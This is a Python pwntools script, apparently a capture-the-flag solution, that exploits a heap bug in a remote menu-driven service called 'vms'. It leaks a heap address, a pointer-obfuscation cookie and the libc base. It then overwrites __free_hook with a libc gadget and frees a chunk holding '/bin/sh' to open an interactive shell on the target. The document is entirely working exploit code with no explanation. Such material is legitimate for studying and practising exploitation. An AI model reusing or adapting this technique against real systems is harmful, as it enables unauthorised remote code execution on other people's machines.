#! /usr/bin/python
from pwn import *

context.log_level = 'debug'
#target = process('/tmp/vms')
target = remote('123.59.56.23', 40265)

def register():
    target.recvuntil('> ')
    target.sendline('1')
    target.recvuntil(': ')
    target.sendline(p64(0)+p64(0x71))
    target.recvuntil(': ')
    target.sendline('23')


def add(title, Len, detail, rank=1):
    target.recvuntil('> ')
    target.sendline('2')
    target.recvuntil(': ')
    target.send(title)
    target.recvuntil(': ')
    target.sendline(str(Len))
    target.recvuntil(': ')
    target.sendline(detail)
    target.recvuntil(': ')
    target.sendline(str(rank))


def edit(title, rank, detail):
    target.recvuntil('> ')
    target.sendline('3')
    target.recvuntil(': ')
    target.send(title)
    target.recvuntil(': ')
    target.send(str(rank))
    target.recvuntil(': ')
    target.sendline(detail)


def delete(title):
    target.recvuntil('> ')
    target.sendline('4')
    target.recvuntil(': ')
    target.send(title)


def show():
    target.recvuntil('> ')
    target.sendline('5')


register()
add('pad\n',8,'/bin/sh')

add('a\n',5,'aa')
add('b\n',5,'aa')
delete('b\n')
delete('a\n')

#leak heap addr
add('a\n',5,'aa',-1)
add('b\n',5,'aa',-1)
show()
target.recvuntil('vuln title: a\nvuln detail: aa\nvuln rank: ')
heapAddr = target.recvline()
heapAddr = int(heapAddr) - 0x120
print hex(heapAddr)

delete('b\n')
delete('a\n')

#make heap
add('a'*48+p64(0)+p64(0x71),5,'aa')
delete('a'*48+p64(0)+p64(0x71))
edit('a'*48+p64(0)+p64(0x71),heapAddr+0xe8,"\x00"*8)


#leak random
add('a\n',8,'aa')
add('b\n',8,'aa',-1)
show()
target.recvuntil('vuln id: 2\nvuln title: b\nvuln detail: aa\nvuln rank: ')
d = target.recvline()
d = int(d)
if d <0:
    d = 0x10000000000000000 - d
cookie = d^(heapAddr+0x110)
print hex(cookie)


#leak libc base
edit('b\n',(heapAddr+0x178)^cookie,'aa')
show()
target.recvuntil('vuln id: 1\nvuln title: a\nvuln detail: ')
d = target.recvline()
d = d[:-1]
libcBase = u64(d+'\x00'*(8-len(d))) + 2400 - 0x3be000
print hex(libcBase)


#overwrite free hook
edit('b\n',(libcBase+0x3C0A10)^cookie,'aa')
edit('a\n',12,p64(libcBase+0x46640))


# gdb.attach(target)
#get shell
delete('pad\n')
target.interactive()